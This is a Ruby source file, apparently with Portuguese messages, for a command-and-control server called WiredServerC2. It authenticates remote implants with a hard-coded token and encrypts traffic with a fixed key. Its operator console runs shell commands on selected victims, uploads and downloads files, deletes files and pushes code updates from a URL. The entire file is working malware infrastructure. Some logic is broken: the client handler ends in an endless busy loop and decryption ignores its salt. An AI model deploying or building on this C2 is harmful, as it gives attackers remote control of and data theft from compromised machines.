require 'socket'
require 'openssl'
require 'thread'
require 'timeout'
require 'readline'
require 'terminal-table' # gem install terminal-table
require 'fileutils'

module WiredServerC2
  PORT = 12345
  PASSWORD = 'foobar'
  AUTH_TOKEN = 'm3uC0d1g0s3cr3t0'
  SALT = "\x00\x11\x22\x33\x44\x55\x66\x77".b
  ITER = 10_000
  KEY_LEN = 32
  IV_LEN = 16
  AUTH_TIMEOUT = 5
  PING_INTERVAL = 10
  PING_TIMEOUT = 5 

  COLOR_RESET = "\e[0m"
  COLOR_INFO = "\e[38;5;51m"
  COLOR_WARN = "\e[38;5;208m"
  COLOR_ERROR = "\e[38;5;196m"
  COLOR_EVENT = "\e[38;5;201m"

  def self.timestamp
    Time.now.strftime("%H:%M:%S")
  end

  def self.log_info(msg)
    puts "#{COLOR_INFO}[+][#{timestamp}] #{msg}#{COLOR_RESET}"
  end

  def self.log_warn(msg)
    puts "#{COLOR_WARN}[!][#{timestamp}] #{msg}#{COLOR_RESET}"
  end

  def self.log_error(msg)
    puts "#{COLOR_ERROR}[-][#{timestamp}] #{msg}#{COLOR_RESET}"
  end

  def self.log_event(client_id, msg)
    puts "#{COLOR_EVENT}[#{client_id}][#{timestamp}] #{msg}#{COLOR_RESET}"
  end

  def self.derive_key_iv(password)
    digest = OpenSSL::Digest::SHA256.new
    key_iv = OpenSSL::PKCS5.pbkdf2_hmac(password, SALT, ITER, KEY_LEN + IV_LEN, digest)
    [key_iv[0...KEY_LEN], key_iv[KEY_LEN..-1]]
  end

  def self.encrypt(data, password)
    key, iv = derive_key_iv(password)
    cipher = OpenSSL::Cipher.new('aes-256-cbc')
    cipher.encrypt
    cipher.key = key
    cipher.iv = iv
    SALT + cipher.update(data) + cipher.final
  end

  def self.decrypt(data, password)
    salt = data[0...8]
    key, iv = derive_key_iv(password)
    cipher = OpenSSL::Cipher.new('aes-256-cbc')
    cipher.decrypt
    cipher.key = key
    cipher.iv = iv
    cipher.update(data[8..-1]) + cipher.final
  end

  class Client
    attr_reader :id, :socket, :addr
    attr_accessor :uname_info

    def initialize(id, socket)
      @id = id
      @socket = socket
      @addr = socket.peeraddr[2]
      @uname_info = "Desconhecido"
    end

    def send_encrypted(msg)
      data = WiredServerC2.encrypt(msg, PASSWORD)
      @socket.write(data)
    end

    def receive_encrypted
      data = @socket.readpartial(4096)
      WiredServerC2.decrypt(data, PASSWORD)
    rescue
      nil
    end

    

    def close
      @socket.close rescue nil
    end
  end

  class Server
    attr_reader :clients, :mutex, :selected_client_id

    def initialize(port)
      @server = TCPServer.new(port)
      @clients = {}
      @mutex = Mutex.new
      @selected_client_id = nil
      @client_counter = 0
    end

    def start
      WiredServerC2.log_info("Servidor C2 iniciado na porta #{PORT}")
      Thread.new { command_interface }
      Thread.new { monitor_clients }


      loop do
        client_socket = @server.accept
        @client_counter += 1
        client_id = "client#{@client_counter}"
        Thread.new { handle_client(client_socket, client_id) }
      end
      
    end

     def handle_client(sock, client_id)
    client = Client.new(client_id, sock)
    WiredServerC2.log_info("Nova conexão de #{client_id} (#{client.addr})")

    begin
      auth_data = nil
      Timeout.timeout(AUTH_TIMEOUT) do
        auth_data = sock.readpartial(64)
      end

      if WiredServerC2.decrypt(auth_data, PASSWORD).strip != AUTH_TOKEN
        WiredServerC2.log_warn("Autenticação falhou para #{client_id}")
        client.close
        return
      end

      @mutex.synchronize { @clients[client_id] = client }
      WiredServerC2.log_info("Cliente #{client_id} autenticado com sucesso.")

      client.send_encrypted('exec "uname -sr"')
      uname_response = client.receive_encrypted
      client.uname_info = uname_response.strip if uname_response

      loop do
         a="s"
      end

    rescue Timeout::Error
      WiredServerC2.log_warn("Timeout de autenticação para #{client_id}")
    rescue => e
      WiredServerC2.log_error("Erro com cliente #{client_id}: #{e}")
    ensure
      @mutex.synchronize { @clients.delete(client_id) }
      client.close
      WiredServerC2.log_info("Cliente #{client_id} removido.")
    end
  end
    def command_interface
      loop do
        prompt_target = nil
        @mutex.synchronize do
          if @selected_client_id && @clients[@selected_client_id]
            client = @clients[@selected_client_id]
            prompt_target = "#{client.id}:#{client.addr}"
          end
        end

        prompt = prompt_target ? "#{Time.now.strftime('%H:%M:%S')} | C2@#{prompt_target} > " : "#{Time.now.strftime('%H:%M:%S')} | C2 > "
        input = Readline.readline(prompt, true)
        break if input.nil?
        cmd = input.strip
        cmd = input.strip
        next if cmd.empty?

        case
        when cmd == 'list'
          list_clients
        when cmd.start_with?('select ')
          _, id = cmd.split
          select_client(id)
        when cmd.start_with?('file delete "')
          send_to_client(cmd)
        when cmd.start_with?('update "')
          send_to_client(cmd)
        when cmd.start_with?('exec "')
          send_to_client(cmd)
          client = @clients[@selected_client_id]
          if client
            response = client.receive_encrypted
            WiredServerC2.log_event(client.id, "#{response}") if response
		  else
			puts "Cliente desconectado."
		  end
		when cmd.start_with?('file put ')
		  matches = cmd.match(/file put\s+"(.+?)"\s+"(.+?)"/)
		  if matches.nil? || matches.captures.size < 2
			puts 'Uso: file put "<local_path>" "<remote_path>"'
			next
		  end

		  local_path = matches[1]
		  remote_path = matches[2]

		  unless File.exist?(local_path)
			puts "Arquivo local não encontrado."
			next
		  end

		  send_to_client("file put \"#{remote_path}\"")
		  client = @clients[@selected_client_id]

		  if client
			ready = client.receive_encrypted
			if ready && ready.include?("ready_to_receive")
			  begin
				filedata = File.binread(local_path)
				client.send_encrypted(filedata)
				ack = client.receive_encrypted
				puts ack if ack
				WiredServerC2.log_event(client.id, "Arquivo enviado: #{local_path} -> #{remote_path}")
			  rescue => e
				puts "Erro ao ler/enviar o arquivo: #{e.message}"
			  end
			else
			  puts "Cliente não está pronto para receber o arquivo."
			end
		  else
			puts "Cliente desconectado."
		  end

        when cmd.start_with?('file get ')
		  matches = cmd.match(/file get\s+"(.+?)"\s+"(.+?)"/)
		  if matches.nil? || matches.captures.size < 2
			puts 'Uso: file get "<remote_path>" "<local_path>"'
			next
		  end

		  remote_path = matches[1]
		  local_path = matches[2]

		  send_to_client(cmd)
		  client = @clients[@selected_client_id]

		  if client
			response = client.receive_encrypted
			if response
			  begin
				File.open(local_path, 'wb') do |file|
				  file.write(response)
				end
				puts "Arquivo salvo em: #{local_path}"
				WiredServerC2.log_event(client.id, "Arquivo salvo: #{local_path}")
			  rescue => e
				puts "Erro ao salvar o arquivo: #{e.message}"
			  end
			else
			  puts "Nenhum dado recebido."
			end
		  else
			puts "Cliente desconectado."
		  end

        when cmd == 'help'
          puts <<~HELP
  ┌─[ Comandos Disponíveis ]────────────────────────────┐
  │ list                           - Lista clientes     │
  │ select <id>                    - Seleciona cliente  │
  │ exec "<cmd>"                   - Executa comando    │
  │ file delete "<arquivo>"        - Remove arquivo     │
  │ file get "<remoto>" "<local>"  - Baixa arquivo      │
  │ file put "<local>" "<remoto>"  - Envia arquivo      │
  │ update "http://url/code.bin    - update code        │
  │ help                           - Mostra ajuda       │
  │ exit                           - Encerra servidor   │
  └─────────────────────────────────────────────────────┘
          HELP
        when cmd == 'exit'
          WiredServerC2.log_info("Encerrando servidor...")
          exit
        else
          puts "Comando desconhecido. Digite 'help' para ajuda."
        end
      end
    end

    def list_clients
      @mutex.synchronize do
        if @clients.empty?
          puts "Nenhum cliente conectado."
        else
          rows = @clients.map { |id, c| [id, c.addr, c.uname_info] }
          table = Terminal::Table.new(title: "Clientes conectados", headings: ['ID', 'IP', 'Info SO'], rows: rows)
          puts table
        end
      end
    end

    def select_client(client_id)
      @mutex.synchronize do
        if @clients.key?(client_id)
          @selected_client_id = client_id
          WiredServerC2.log_info("Cliente #{client_id} selecionado.")
        else
          puts "Cliente #{client_id} não encontrado."
        end
      end
    end
    
    def monitor_clients
	  loop do
		sleep(PING_INTERVAL)

		@mutex.synchronize do
		  @clients.each do |id, client|
			Thread.new do
			  begin
				client.send_encrypted('exec "echo pong"')
				Timeout.timeout(PING_TIMEOUT) do
				  response = client.receive_encrypted
				  unless response && response.strip.downcase.include?("pong")
					raise "Resposta inválida"
				  end
				end
			  rescue => e
				WiredServerC2.log_warn("Cliente #{id} não respondeu ao ping. Removendo...")
				@mutex.synchronize { @clients.delete(id) }
				client.close
			  end
			end
		  end
		end
	  end
	end


    def send_to_client(cmd)
      @mutex.synchronize do
        if (client = @clients[@selected_client_id])
          client.send_encrypted(cmd)
          WiredServerC2.log_info("Comando enviado para #{@selected_client_id}: #{cmd}")
        else
          puts "Nenhum cliente selecionado ou cliente desconectado."
        end
      end
    end
  end
end

if __FILE__ == $0
  server = WiredServerC2::Server.new(WiredServerC2::PORT)
  server.start
end
